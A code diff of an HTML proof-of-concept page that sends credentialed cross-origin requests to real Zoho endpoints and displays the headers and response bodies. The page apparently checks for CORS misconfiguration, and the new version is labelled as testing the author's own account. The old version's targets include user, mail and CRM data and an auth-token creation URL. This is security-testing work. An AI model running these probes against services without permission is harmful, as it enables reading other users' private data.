@@ -1,52 +1,32 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <title>CORS Impact PoC</title>
-</head>
+<head><title>CORS PoC</title></head>
 <body>
-  <h2>CORS Real Impact Test</h2>
-  <button onclick="runAll()">Run Test</button>
-  <pre id="output" style="background:#111;color:#0f0;padding:10px;font-size:13px;"></pre>
-
+<h2>CORS PoC - Own Test Account</h2>
+<button onclick="runAll()">Run Test</button>
+<pre id="out" style="background:#111;color:#0f0;padding:10px;"></pre>
 <script>
-const out = document.getElementById('output');
-function log(msg) { out.textContent += msg + "\n"; }
+const out = document.getElementById('out');
+function log(m){ out.textContent += m + "\n"; }
 
-async function test(label, url, opts={}) {
+async function test(label, url){
   log("\n=== " + label + " ===");
   try {
-    const res = await fetch(url, { credentials: "include", ...opts });
-    const text = await res.text();
-    log("Status: " + res.status);
-    log("ACAO: " + res.headers.get("Access-Control-Allow-Origin"));
-    log("ACAC: " + res.headers.get("Access-Control-Allow-Credentials"));
-    log("Body: " + text.substring(0, 300));
-  } catch(e) {
-    log("BLOCKED: " + e.message);
-  }
+    const r = await fetch(url, { credentials:"include" });
+    log("Status: " + r.status);
+    log("ACAO: " + r.headers.get("Access-Control-Allow-Origin"));
+    const t = await r.text();
+    log("Body: " + t.substring(0,400));
+  } catch(e){ log("BLOCKED: " + e.message); }
 }
 
-async function runAll() {
+async function runAll(){
   out.textContent = "Testing...\n";
-
-  await test("Zoho People - User Info",
-    "https://people.zoho.com/people/api/forms/json/P_EmployeeView/getRecords");
-
-  await test("Zoho CRM - User",
-    "https://crm.zoho.com/crm/private/json/Users/getUsers?type=CurrentUser");
-
-  await test("Accounts - User Info",
-    "https://accounts.zoho.com/apiauthtoken/nb/create?SCOPE=ZohoCRM/crmapi&EMAIL_ID=&PASSWORD=");
-
-  await test("Zoho Mail - Folders",
-    "https://mail.zoho.com/api/accounts/me/folders");
-
-  await test("WorkDrive - Info",
-    "https://workdrive.zoho.com/api/v1/users/me");
-
-  await test("Projects - Portal",
-    "https://projectsapi.zoho.com/restapi/portal/");
-
+  await test("Upload - Root", "https://upload-accl.zoho.com/");
+  await test("Upload - Info", "https://upload-accl.zoho.com/upload/info");
+  await test("Upload - Status", "https://upload-accl.zoho.com/upload/status");
+  await test("Upload - User", "https://upload-accl.zoho.com/upload/user");
+  await test("Upload - Files", "https://upload-accl.zoho.com/upload/files");
   log("\n=== DONE ===");
 }
 </script>
